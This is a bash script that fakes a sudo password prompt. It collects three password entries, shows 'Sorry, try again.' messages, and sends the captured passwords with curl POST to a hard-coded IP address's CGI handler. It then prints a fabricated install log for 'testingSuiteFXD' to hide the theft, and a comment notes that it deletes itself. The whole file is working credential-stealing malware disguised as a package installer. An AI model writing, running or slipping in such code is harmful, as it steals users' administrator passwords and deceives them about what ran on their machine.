#!/bin/bash

list=()
int=1

while [ $int -le 3 ]
do

    read -sp "[sudo] password for $USER: " pwd < /dev/tty
    echo ""

    if [ ${#pwd} -ge 4 ]; then
        ((int++))
    fi

    sleep $(awk 'BEGIN{srand(); print 0.4 + rand() * 1}')

    if [ $int -le 3 ]; then
        echo "Sorry, try again."
    fi

    list+=("$pwd")
done

# encore pwd into something
s=""
for entry in "${list[@]}"; do
    if [[ -n "$s" ]]; then
        s+=", "
    fi
    s+="$entry"
done

receiver_ip="192.168.50.32"

curl -X POST --data-raw "$s" http://$receiver_ip:8000/cgi-bin/handler.py

# fake alot of stuff

read -r -d '' brew_output <<EOF
Downloading testingSuiteFXD
[INFO] Disk space check: 54.2GB available. Proceeding.
testingSuiteFXD.tar.gz   [=====>                             ]  15%  41.2M  18.4MB/s   eta 12s
[WARN] Network jitter detected. Retrying packet 8491...
[WARN] Packet 8491 re-sent successfully.
testingSuiteFXD.tar.gz   [================>                  ]  51%   139M  17.9MB/s   eta 6s
[DEBUG] Flushing memory buffer to disk.
[DEBUG] Syncing file descriptor 7.
testingSuiteFXD.tar.gz   [=============================>     ]  89%   242M  19.1MB/s   eta 1s
[DEBUG] Received final packet. Assembling file.
testingSuiteFXD.tar.gz   [==================================>] 100%   271M  18.8MB/s   in 14.4s
EOF

# Read the multi-line string line by line
while IFS= read -r line; do
  # Print the current line
  echo "$line"
  
  # Pause for a very short, random duration to make it look realistic
  sleep $(awk 'BEGIN{srand(); print 0.1 + rand() * 0.3}')
done <<< "$brew_output"

echo Successfully installed testingSuiteFXD

#sleep 2
#clear

# deletes itself (in the downlaod script)
